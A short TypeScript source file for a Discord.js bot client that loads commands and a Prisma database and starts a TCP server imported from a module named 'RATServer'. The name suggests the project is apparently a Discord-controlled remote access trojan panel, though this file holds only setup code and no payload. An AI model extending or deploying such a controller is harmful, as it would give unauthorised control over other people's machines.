import { Client, Collection } from "discord.js";
import { PrismaClient, Prisma } from "@prisma/client";
import { DefaultArgs } from "@prisma/client/runtime/library";
import ICustomClient from "../interfaces/ICustomClient";
import IConfig from "../interfaces/IConfig";
import Handler from "./Handler";
import Command from "./Command";
import SubCommand from "./SubCommand";
import TCPServer from "./RATServer";

export default class CustomClient extends Client implements ICustomClient {
    commands: Collection<string, Command>;
    config: IConfig;
    cooldowns: Collection<string, Collection<string, number>>;
    database: PrismaClient<Prisma.PrismaClientOptions, never, DefaultArgs>;
    handler: Handler;
    ratServer: TCPServer;
    subCommands: Collection<string, SubCommand>;


    constructor() {
        super({intents:[]});

        this.commands = new Collection();
        this.config = require(`${process.cwd()}/data/config.json`);
        this.cooldowns = new Collection();
        this.database = new PrismaClient();
        this.handler = new Handler(this);
        this.ratServer = new TCPServer(this);
        this.subCommands = new Collection();
    }
    
    
    Init(): void {
        this.LoadHandlers();
        this.ratServer.start();
        this.login(this.config.token)
            .catch((err) => console.error(err));
    }

    LoadHandlers(): void {
        this.handler.LoadEvents();
        this.handler.LoadCommands();
    }
}